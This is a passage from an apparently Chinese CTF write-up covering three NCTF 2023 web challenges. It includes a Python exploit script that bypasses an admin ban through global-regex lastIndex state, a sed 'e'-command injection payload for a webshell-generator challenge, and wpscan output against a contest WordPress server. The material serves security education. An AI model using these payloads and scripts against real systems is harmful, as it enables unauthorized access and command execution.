class="hljs-string">&quot;/api/login&quot;</span>, requireLogin, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;登录成功！&quot;</span>)&#125;)app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/flag&quot;</span>, requireLogin, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    <span class="hljs-keyword">let</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>    <span class="hljs-keyword">if</span> (username !== <span class="hljs-string">&quot;admin&quot;</span>) &#123;        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;登录成功，但是只有&#x27;admin&#x27;用户可以看到flag，你的用户名是&#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27;&quot;</span>)        <span class="hljs-keyword">return</span>    &#125;    <span class="hljs-keyword">let</span> flag = child_process.<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&quot;cat flag&quot;</span>).<span class="hljs-title function_">toString</span>()    res.<span class="hljs-title function_">end</span>(flag)    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;有人获取到了flag！为了保证题目的正常运行，将会重置靶机环境！&quot;</span>)    res.<span class="hljs-title function_">on</span>(<span class="hljs-string">&quot;finish&quot;</span>, <span class="hljs-function">() =&gt;</span> &#123;        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123; process.<span class="hljs-title function_">exit</span>(<span class="hljs-number">0</span>) &#125;, <span class="hljs-number">1</span>)    &#125;)    <span class="hljs-keyword">return</span>&#125;)app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/ban_user&#x27;</span>, requireLogin, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    <span class="hljs-keyword">let</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>    <span class="hljs-keyword">let</span> ban_username = req.<span class="hljs-property">body</span>.<span class="hljs-property">ban_username</span>    <span class="hljs-keyword">if</span>(!ban_username)&#123;        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ban_username不能为空&quot;</span>)        <span class="hljs-keyword">return</span>    &#125;    <span class="hljs-keyword">if</span>(username === ban_username)&#123;        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;不能封禁自己&quot;</span>)        <span class="hljs-keyword">return</span>    &#125;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> name <span class="hljs-keyword">of</span> banned_users)&#123;        <span class="hljs-keyword">if</span> (name === ban_username) &#123;            res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;用户已经被封禁&quot;</span>)            <span class="hljs-keyword">return</span>        &#125;    &#125;    banned_users.<span class="hljs-title function_">push</span>(ban_username)    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;封禁成功！&quot;</span>)&#125;)app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;/static/index.html&quot;</span>)&#125;)app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> &#123;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`listening on port <span class="hljs-subst">$&#123;port&#125;</span>`</span>)&#125;)</code></pre></div><p>既然admin已经被封禁了，那我们的思路只能是绕过检测</p><p>有两个检测，我们先看第二个<code>in</code>关键字</p><p><code>in</code>关键字返回的是数组下标索引，不是元素</p><div class="code-wrapper"><pre><code class="hljs awk">var trees = new Array(<span class="hljs-string">&quot;redwood&quot;</span>, <span class="hljs-string">&quot;bay&quot;</span>, <span class="hljs-string">&quot;cedar&quot;</span>, <span class="hljs-string">&quot;oak&quot;</span>, <span class="hljs-string">&quot;maple&quot;</span>);<span class="hljs-number">0</span> <span class="hljs-keyword">in</span> trees; <span class="hljs-regexp">//</span> 返回 true<span class="hljs-number">3</span> <span class="hljs-keyword">in</span> trees; <span class="hljs-regexp">//</span> 返回 true<span class="hljs-number">6</span> <span class="hljs-keyword">in</span> trees; <span class="hljs-regexp">//</span> 返回 false<span class="hljs-string">&quot;bay&quot;</span> <span class="hljs-keyword">in</span> trees; <span class="hljs-regexp">//</span> 返回 false (必须使用索引号，而不是数组元素的值)</code></pre></div><p>所以第二个检测几乎是没有作用</p><p>接下来看第一个，带g的正则表达式我们可以查到</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/test">RegExp.prototype.test() - JavaScript | MDN (mozilla.org)</a></p><div class="code-wrapper"><pre><code class="hljs node-repl"><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-keyword">let</span> r = <span class="hljs-regexp">/^admin$/g</span></span>undefined<span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">r.<span class="hljs-title function_">test</span>(<span class="hljs-string">&quot;admin&quot;</span>)</span>true<span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">r.<span class="hljs-property">lastIndex</span></span>5<span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">r.<span class="hljs-title function_">test</span>(<span class="hljs-string">&quot;admin&quot;</span>)</span>false<span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">r.<span class="hljs-property">lastIndex</span></span>0</code></pre></div><p>这里就是一个可以逃过检测的地方</p><p>但是</p><div class="code-wrapper"><pre><code class="hljs scss"><span class="hljs-comment">// 每次请求前，更新封禁用户正则信息</span>app<span class="hljs-selector-class">.use</span>(function (req, res, next) &#123;    try &#123;        <span class="hljs-built_in">build_banned_users_regex</span>()      console<span class="hljs-selector-class">.log</span>(&quot;封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）：&quot;,banned_users_regex)    &#125; catch (e) &#123;    &#125;    <span class="hljs-built_in">next</span>()&#125;)</code></pre></div><p>每次请求都会重新生成一个新的正则表达式，都会使<code>r.lastIndex</code>重新置为0</p><blockquote><p>思路就是在新的regex对象赋值之前，抛出 异常 来绕过 regex 的更新！</p><p>因为try catch的存在，在<code>build_banned_users_regex</code>方法内抛出异常不会导致请求被中断</p><p>如果传入 escapeRegExp(string) 函数中的 string 参数为非字符串类型，</p><p>则string不存在 replace 属性，会抛出TypeError，如此来绕过 regex 的更新</p></blockquote><p>所以我们传入参数 <code>ban_username</code> 为 对象、数组 等其他数据类型</p><p>当我们使用<code>/api/ban_user</code>把其他数据类型加入到<code>banned_users</code>数组后</p><p>每次请求时都会抛出<code>TypeError</code></p><p>所以当我们封禁了这个其他数据类型后，我们使用的就是一直是同一个正则表达式了</p><p>测试一下，我们把获取到flag就退出的代码删掉，执行以下代码，若出现三次<code>whoami</code>的结果，猜想即是正确的</p><div class="code-wrapper"><pre><code class="hljs stylus">import requestsremote_addr=<span class="hljs-string">&quot;http://localhost:80&quot;</span>rs = requests<span class="hljs-selector-class">.Session</span>()resp = rs<span class="hljs-selector-class">.post</span>(remote_addr+<span class="hljs-string">&quot;/api/register&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>&#125;)<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(resp.text)</span></span>resp = rs<span class="hljs-selector-class">.post</span>(remote_addr+<span class="hljs-string">&quot;/api/ban_user&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;ban_username&quot;</span>:<span class="hljs-selector-attr">[0]</span>&#125;)<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(resp.text)</span></span>#匹配成功，r.lastIndex变为<span class="hljs-number">5</span>resp = rs<span class="hljs-selector-class">.post</span>(remote_addr+<span class="hljs-string">&quot;/api/flag&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;)<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(resp.text)</span></span>#匹配失败，获取flag，r.lastIndex的结果重置<span class="hljs-number">0</span>resp = rs<span class="hljs-selector-class">.post</span>(remote_addr+<span class="hljs-string">&quot;/api/flag&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;)<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(resp.text)</span></span>#匹配成功，r.lastIndex变为<span class="hljs-number">5</span>resp = rs<span class="hljs-selector-class">.post</span>(remote_addr+<span class="hljs-string">&quot;/api/flag&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;)<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(resp.text)</span></span>#匹配失败，获取flag，r.lastIndex的结果重置<span class="hljs-number">0</span>resp = rs<span class="hljs-selector-class">.post</span>(remote_addr+<span class="hljs-string">&quot;/api/flag&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;)<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(resp.text)</span></span>#匹配成功，r.lastIndex变为<span class="hljs-number">5</span>resp = rs<span class="hljs-selector-class">.post</span>(remote_addr+<span class="hljs-string">&quot;/api/flag&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;)<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(resp.text)</span></span>#匹配失败，获取flag，r.lastIndex的结果重置<span class="hljs-number">0</span>resp = rs<span class="hljs-selector-class">.post</span>(remote_addr+<span class="hljs-string">&quot;/api/flag&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;)<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(resp.text)</span></span></code></pre></div><div class="code-wrapper"><pre><code class="hljs livescript">注册成功封禁成功！用户<span class="hljs-string">&#x27;admin&#x27;</span>被封禁，无法鉴权！zeropeach<span class="hljs-string">\86136</span>用户<span class="hljs-string">&#x27;admin&#x27;</span>被封禁，无法鉴权！zeropeach<span class="hljs-string">\86136</span>用户<span class="hljs-string">&#x27;admin&#x27;</span>被封禁，无法鉴权！zeropeach<span class="hljs-string">\86136</span></code></pre></div><p>所以封禁后，用的一直就是同一个表达式</p><p>先访问<code>/api/flag</code>匹配一次admin，使<code>r.lastIndex</code>变为5后</p><p>再次访问<code>/api/flag</code>，因为没有更新所以<code>r.lastIndex</code>仍为5，所以<code>banned_users_regex.text(&quot;admin&quot;)</code>的结果就变为<code>false</code>，就绕过了</p><p>因为1分钟会重置，再加上出错不知道维持多久，所以要快，应该用python写代码会好一些，但我懒得写于是分四块依次发包</p><p><img src="/../images/NCTF2023/image-20231226111525334.png" alt="image-20231226111525334"></p><p><img src="/../images/NCTF2023/image-20231226111536455.png" alt="image-20231226111536455"></p><p><img src="/../images/NCTF2023/image-20231226111548860.png" alt="image-20231226111548860"></p><p><img src="/../images/NCTF2023/image-20231226111716939.png" alt="image-20231226111716939"></p><div class="code-wrapper"><pre><code class="hljs stylus">import requestsremote_addr=<span class="hljs-string">&quot;http://117.50.175.234:9001&quot;</span>rs = requests<span class="hljs-selector-class">.Session</span>()resp = rs<span class="hljs-selector-class">.post</span>(remote_addr+<span class="hljs-string">&quot;/api/register&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>&#125;)<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(resp.text)</span></span>resp = rs<span class="hljs-selector-class">.post</span>(remote_addr+<span class="hljs-string">&quot;/api/ban_user&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;ban_username&quot;</span>:<span class="hljs-selector-attr">[0]</span>&#125;)<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(resp.text)</span></span>resp = rs<span class="hljs-selector-class">.post</span>(remote_addr+<span class="hljs-string">&quot;/api/flag&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;)<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(resp.text)</span></span>resp = rs<span class="hljs-selector-class">.post</span>(remote_addr+<span class="hljs-string">&quot;/api/flag&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;)<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(resp.text)</span></span></code></pre></div><h2 id="webshell-generator"><a href="#webshell-generator" class="headerlink" title="webshell generator"></a>webshell generator</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">security_validate</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\r|\n/&#x27;</span>, <span class="hljs-variable">$value</span>)) &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$key</span> 不能包含换行符！&quot;</span>);        &#125;        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$value</span>) &gt; <span class="hljs-number">114</span>) &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$key</span> 不能超过114个字符！&quot;</span>);        &#125;    &#125;&#125;<span class="hljs-title function_ invoke__">security_validate</span>();<span class="hljs-keyword">if</span> (@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;method&#x27;</span>] &amp;&amp; @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] &amp;&amp; @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) &#123;    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;language&#x27;</span>] !== <span class="hljs-string">&#x27;PHP&#x27;</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;PHP是最好的语言&quot;</span>);    &#125;    <span class="hljs-variable">$method</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;method&#x27;</span>];    <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>];    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;METHOD=<span class="hljs-subst">$method</span>&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你的method太复杂了！&quot;</span>);    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;KEY=<span class="hljs-subst">$key</span>&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你的key太复杂了！&quot;</span>);    <span class="hljs-variable">$status_code</span> = -<span class="hljs-number">1</span>;    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;sh generate.sh&quot;</span>);    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$filename</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;生成失败了！&quot;</span>);    &#125;    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$filename</span>);    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: download.php?file=<span class="hljs-subst">$filename</span>&amp;filename=<span class="hljs-subst">&#123;$_POST[&#x27;filename&#x27;]&#125;</span>&quot;</span>);    <span class="hljs-keyword">exit</span>();&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">//download.php  能够下载文件</span><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: application/octet-stream&quot;</span>);    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Disposition: attachment; filename=<span class="hljs-subst">$filename</span>&quot;</span>);    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$file</span>);    <span class="hljs-keyword">exit</span>();&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs bash">generate.sh    <span class="hljs-comment">#!/bin/sh</span><span class="hljs-built_in">set</span> -eNEW_FILENAME=$(<span class="hljs-built_in">tr</span> -dc a-z0-9 &lt;/dev/urandom | <span class="hljs-built_in">head</span> -c 16)<span class="hljs-built_in">cp</span> template.php <span class="hljs-string">&quot;/tmp/<span class="hljs-variable">$NEW_FILENAME</span>&quot;</span><span class="hljs-built_in">cd</span> /tmpsed -i <span class="hljs-string">&quot;s/KEY/<span class="hljs-variable">$KEY</span>/g&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$NEW_FILENAME</span>&quot;</span>sed -i <span class="hljs-string">&quot;s/METHOD/<span class="hljs-variable">$METHOD</span>/g&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$NEW_FILENAME</span>&quot;</span><span class="hljs-built_in">realpath</span> <span class="hljs-string">&quot;<span class="hljs-variable">$NEW_FILENAME</span>&quot;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs php">template.php<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_METHOD</span>[<span class="hljs-string">&quot;KEY&quot;</span>]);</code></pre></div><p>download.php可以任意文件读。无权限读取&#x2F;flag。</p><ol><li>任意文件读取index.php得知赋值环境变量后调用了<code>sh generate.sh</code>，任意文件读取（或者直接HTTP访问&#x2F;generate.sh可以下载）generate.sh得知使用<code>sed -i &quot;s/METHOD/$METHOD/g&quot;</code>替换Webshell模板中的关键字。因为使用了双引号，可以进行shell参数展开，但是不能进行shell命令注入，并且只能展开为单个参数。</li><li>[查询man手册或互联网](<a href="https://www.gnu.org/software/sed/manual/sed.html#sed-commands-list:~:text=newline">https://www.gnu.org/software/sed/manual/sed.html#sed-commands-list:~:text=newline</a> is suppressed.-,e,-command)得知，<code>GNU sed</code>可以通过<code>e</code>指令执行系统命令。闭合原先的<code>s</code>指令，执行<code>/readflag</code>，会将flag插入到输出文件的第一行。自动跳转到download.php读取即可。</li></ol><p>sed指令可以通过换行符分隔，[也可以通过;分隔](<a href="https://www.gnu.org/software/sed/manual/sed.html#sed-script-overview:~:text=can">https://www.gnu.org/software/sed/manual/sed.html#sed-script-overview:~:text=can</a> be separated by semicolons (%3B))。</p><p>通过F12修改页面源码或抓包软件绕过前端格式限制。</p><p>exp：提交key为</p><div class="code-wrapper"><pre><code class="hljs JavaScript">/g;1e /readflag;s<span class="hljs-comment">//</span></code></pre></div><h2 id="ez-wordpress"><a href="#ez-wordpress" class="headerlink" title="ez_wordpress"></a>ez_wordpress</h2><p>这种类似实战渗透的需要进行信息收集等，没咋弄过，一般的cms都没看过，别说打较新的版本了</p><p>搜到了<code>WP_HTML_Token</code>但找不到<code>poc</code>，唉，不懂咧</p><p><code>wpscan</code>专门用来进行<code>wordpress</code>信息收集，出题人给出了扫描结果（太多人扫描,服务器不行）</p><p>前一段时间的DASCTF X 0psu3 也有一道wordpress，后来再看</p><div class="code-wrapper"><pre><code class="hljs gherkin">➜ ~ wpscan --url <span class="hljs-string">&quot;http://120.27.148.152:8012/&quot;</span>_______________________________________________________________         __          _______   _____         \ \        / /  __ \ / ____|<span class="hljs-string"></span><span class="hljs-string">          \ \  /\  / /</span>|<span class="hljs-string"> </span>|<span class="hljs-string">__) </span>|<span class="hljs-string"> (___   ___  __ _ _ __ ®</span><span class="hljs-string">           \ \/  \/ / </span>|<span class="hljs-string">  ___/ \___ \ / __</span>|<span class="hljs-string">/ _` </span>|<span class="hljs-string"> &#x27;_ \</span><span class="hljs-string">            \  /\  /  </span>|<span class="hljs-string"> </span>|<span class="hljs-string">     ____) </span>|<span class="hljs-string"> (__</span>|<span class="hljs-string"> (_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|             \/  \/   |<span class="hljs-string">_</span>|<span class="hljs-string">    </span>|<span class="hljs-string">_____/ \___</span>|<span class="hljs-string">\__,_</span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|         WordPress Security Scanner by the WPScan Team                         Version 3.8.25       Sponsored by Automattic - https://automattic.com/       <span class="hljs-meta">@_WPScan_,</span> <span class="hljs-meta">@ethicalhack3r,</span> <span class="hljs-meta">@erwan_lr,</span> <span class="hljs-meta">@firefart</span>_______________________________________________________________[+] URL: http://120.27.148.152:8012/ [120.27.148.152][+] Started: Sat Dec 23 17:24:31 2023Interesting Finding(s):[+] Headers |<span class="hljs-string"> Interesting Entries:</span><span class="hljs-string"> </span>|<span class="hljs-string">  - Server: Apache/2.4.51 (Debian)</span><span class="hljs-string"> </span>|<span class="hljs-string">  - X-Powered-By: PHP/7.4.27</span><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Headers (Passive Detection)</span><span class="hljs-string"> </span>|<span class="hljs-string"> Confidence: 100%</span><span class="hljs-string"></span><span class="hljs-string">[+] XML-RPC seems to be enabled: http://120.27.148.152:8012/xmlrpc.php</span><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Direct Access (Aggressive Detection)</span><span class="hljs-string"> </span>|<span class="hljs-string"> Confidence: 100%</span><span class="hljs-string"> </span>|<span class="hljs-string"> References:</span><span class="hljs-string"> </span>|<span class="hljs-string">  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><span class="hljs-string"> </span>|<span class="hljs-string">  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><span class="hljs-string"> </span>|<span class="hljs-string">  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><span class="hljs-string"> </span>|<span class="hljs-string">  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><span class="hljs-string"> </span>|<span class="hljs-string">  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><span class="hljs-string"></span><span class="hljs-string">[+] WordPress readme found: http://120.27.148.152:8012/readme.html</span><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Direct Access (Aggressive Detection)</span><span class="hljs-string"> </span>|<span class="hljs-string"> Confidence: 100%</span><span class="hljs-string"></span><span class="hljs-string">[+] The external WP-Cron seems to be enabled: http://120.27.148.152:8012/wp-cron.php</span><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Direct Access (Aggressive Detection)</span><span class="hljs-string"> </span>|<span class="hljs-string"> Confidence: 60%</span><span class="hljs-string"> </span>|<span class="hljs-string"> References:</span><span class="hljs-string"> </span>|<span class="hljs-string">  - https://www.iplocation.net/defend-wordpress-from-ddos</span><span class="hljs-string"> </span>|<span class="hljs-string">  - https://github.com/wpscanteam/wpscan/issues/1299</span><span class="hljs-string"></span><span class="hljs-string">[+] WordPress version 6.4.1 identified (Insecure, released on 2023-11-09).</span><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Emoji Settings (Passive Detection)</span><span class="hljs-string"> </span>|<span class="hljs-string">  - http://120.27.148.152:8012/, Match: &#x27;wp-includes\/js\/wp-emoji-release.min.js?ver=6.4.1&#x27;</span><span class="hljs-string"> </span>|<span class="hljs-string"> Confirmed By: Meta Generator (Passive Detection)</span><span class="hljs-string"> </span>|<span class="hljs-string">  - http://120.27.148.152:8012/, Match: &#x27;WordPress 6.4.1&#x27;</span><span class="hljs-string"></span><span class="hljs-string">[+] WordPress theme in use: twentytwentyfour</span><span class="hljs-string"> </span>|<span class="hljs-string"> Location: http://120.27.148.152:8012/wp-content/themes/twentytwentyfour/</span><span class="hljs-string"> </span>|<span class="hljs-string"> Readme: http://120.27.148.152:8012/wp-content/themes/twentytwentyfour/readme.txt</span><span class="hljs-string"> </span>|<span class="hljs-string"> Style URL: http://120.27.148.152:8012/wp-content/themes/twentytwentyfour/style.css</span><span class="hljs-string"> </span>| |<span class="hljs-string"> Found By: Urls In Homepage (Passive Detection)</span><span class="hljs-string"> </span>| |<span class="hljs-string"> The version could not be determined.</span><span class="hljs-string"></span><span class="hljs-string">[+] Enumerating All Plugins (via Passive Methods)</span><span class="hljs-string">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span><span class="hljs-string"></span><span class="hljs-string">[i] Plugin(s) Identified:</span><span class="hljs-string"></span><span class="hljs-string">[+] all-in-one-video-gallery</span><span class="hljs-string"> </span>|<span class="hljs-string"> Location: http://120.27.148.152:8012/wp-content/plugins/all-in-one-video-gallery/</span><span class="hljs-string"> </span>|<span class="hljs-string"> Last Updated: 2023-09-01T08:47:00.000Z</span><span class="hljs-string"> </span>|<span class="hljs-string"> [!] The version is out of date, the latest version is 3.5.2</span><span class="hljs-string"> </span>| |<span class="hljs-string"> Found By: Urls In Homepage (Passive Detection)</span><span class="hljs-string"> </span>| |<span class="hljs-string"> Version: 2.6.0 (80% confidence)</span><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Readme - Stable Tag (Aggressive Detection)</span><span class="hljs-string"> </span>|<span class="hljs-string">  - http://120.27.148.152:8012/wp-content/plugins/all-in-one-video-gallery/README.txt</span><span class="hljs-string"></span><span class="hljs-string">[+] contact-form-7</span><span class="hljs-string"> </span>|<span class="hljs-string"> Location: http://120.27.148.152:8012/wp-content/plugins/contact-form-7/</span><span class="hljs-string"> </span>|<span class="hljs-string"> Last Updated: 2023-12-19T04:49:00.000Z</span><span class="hljs-string"> </span>|<span class="hljs-string"> [!] The version is out of date, the latest version is 5.8.5</span><span class="hljs-string"> </span>| |<span class="hljs-string"> Found By: Urls In Homepage (Passive Detection)</span><span class="hljs-string"> </span>| |<span class="hljs-string"> Version: 5.8.4 (90% confidence)</span><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Query Parameter (Passive Detection)</span><span class="hljs-string"> </span>|<span class="hljs-string">  - http://120.27.148.152:8012/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.8.4</span><span class="hljs-string"> </span>|<span class="hljs-string"> Confirmed By: Readme - Stable Tag (Aggressive Detection)</span><span class="hljs-string"> </span>|<span class="hljs-string">  - http://120.27.148.152:8012/wp-content/plugins/contact-form-7/readme.txt</span><span class="hljs-string"></span><span class="hljs-string">[+] drag-and-drop-multiple-file-upload-contact-form-7</span><span class="hljs-string"> </span>|<span class="hljs-string"> Location: http://120.27.148.152:8012/wp-content/plugins/drag-and-drop-multiple-file-upload-contact-form-7/</span><span class="hljs-string"> </span>|<span class="hljs-string"> Last Updated: 2023-12-05T07:37:00.000Z</span><span class="hljs-string"> </span>|<span class="hljs-string"> [!] The version is out of date, the latest version is 1.3.7.4</span><span class="hljs-string"> </span>| |<span class="hljs-string"> Found By: Urls In Homepage (Passive Detection)</span><span class="hljs-string"> </span>| |<span class="hljs-string"> Version: 1.3.6.2 (80% confidence)</span><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Readme - Stable Tag (Aggressive Detection)</span><span class="hljs-string"> </span>|<span class="hljs-string">  - http://120.27.148.152:8012/wp-content/plugins/drag-and-drop-multiple-file-upload-contact-form-7/readme.txt</span><span class="hljs-string"></span><span class="hljs-string">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><span class="hljs-string"> Checking Config Backups - Time: 00:00:01 &lt;=======================================================================================&gt; (137 / 137) 